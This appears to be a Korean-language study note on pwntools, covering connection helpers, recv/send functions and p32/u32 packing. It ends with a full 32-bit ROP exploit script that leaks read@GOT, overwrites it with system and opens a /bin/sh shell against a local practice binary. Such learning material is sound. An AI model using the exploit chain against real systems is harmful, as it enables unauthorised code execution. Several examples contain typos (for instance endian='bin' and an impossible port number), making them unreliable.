* NC
remote(IP, PORT) ; IP-string, PORT-int
ex) p = remote("localhost", 1234)

* Local
process(PAHT) ; PATH-string
e ) p = process("./test")

* SSH
ssh(USERNAEM, IP, PORT, PASSWORD) ; USERNAME, IP, PASSWORD - string, PORT - int
                                  ; port=, password=
ex) p = ssh("test", "localhost", port=1234, password="test")
ex) p2 = p.run("/bin/sh")

``` C
//recv_send.c
#include<stdio.h>
#include<stdlib.h>
#include<time.h>

int main(int argc, char *argv[]){
	srand(time(NULL));
	int pass= rand();
	int input;
  
	alarm(1);
  
	printf("Passcode : %d\n", pass);
	scanf("%d",&input);

	if(pass==input) printf("Good!\n");
	else printf(":(\n");

	return 0;
}
```
* recvline() : 한 줄을 받아온다.
tmp = p.recvline()
password = tmp[tmp.find(':')+2:len(tmp)-1]
or
passcode = p.recvline()[10:]

* recvuntil(str) : str까지 받아온다

* recv(int) : int만큼 만 받아온다
p.recvuntil('Passcode:')
passcode = p.recv(2048)

``` python
# exp.py
from pwn import *

p = process("./recv_send")

tmp = p.recvline()
passcode= tmp[tmp.find(':')+2:len(tmp)-1]
p.sendline(passcode)
print p.recv(2048)
```

* packing
  * p32 : 32bit little endian으로 packing
  ex) p32(0x12345678) => \x78\x56\x34\x12
  ex) p32(0x12345678, endian='bin') : big endian으로 packing
  * p64 : 64bit little endian으로 packing
  ex) p64(0x12345678) = \x00\x00\x00\x00\x78\x56\x34\x12
  ex) p64(0x12345678, endian='bin') : big endian으로 packing

* unpacking
  * u32 : 32bit little endian을 unpack
  ex) u32("\x78\x56\x34\x12") => 305419896(= 0x12345678)
  ex) u32("\x78\x56\x34\x12", endian='bin') : big endian으로 unpack
  * u64 : 64bit little endian을 unpack
  
* interactive()
ex) p = remote("108.61.161.168", 12341234123)
    ''''
    p. interactive()
 
 ``` python
 from pwn import *

PPPR = 0x080484b6
read_plt = 0x0804832c 
read_got = 0x0804961c
write_plt = 0x0804830c
bss = 0x08049628
offset = 0x99a10
binsh = "/bin/sh"

len_binsh = len(binsh)

p = remote("localhost", 9904)

pay = "A"*140
pay += p32(read_plt)+p32(PPPR)+p32(0)+p32(bss)+p32(len_binsh)	    #read(0, bss, 8)	 => Overwrite /bin/sh to bss
pay += p32(write_plt)+p32(PPPR)+p32(1)+p32(read_got)+p32(4)	    #write(1, read_got, 4)  => printf read_got
pay += p32(read_plt)+p32(PPPR)+p32(0)+p32(read_got)+p32(4)	    #read(0, read_got, 4)   => Overwrite system to read_got
pay += p32(read_plt)+"ABCD"+p32(bss)				    #read("ABCD", bss)  =>   system(bss)  =>  system("/bin/sh")

print "Send Explot : %s" % pay

p.send(pay)

print "Send /bin/sh : %s" % binsh

p.send(binsh)

sleep(1)

print "Reseving"

tm = p.recv(4)

print "Reseve Complete!"
print "read_got : %x" % u32(tm)

sys = u32(tm) - offset

print "system_plt : %x" % sys

p.send(p32(sys))

sleep(0.3)

print "Send system"

p.sendline("id")

sleep(1)

print p.recvline()

p.interactive()
```
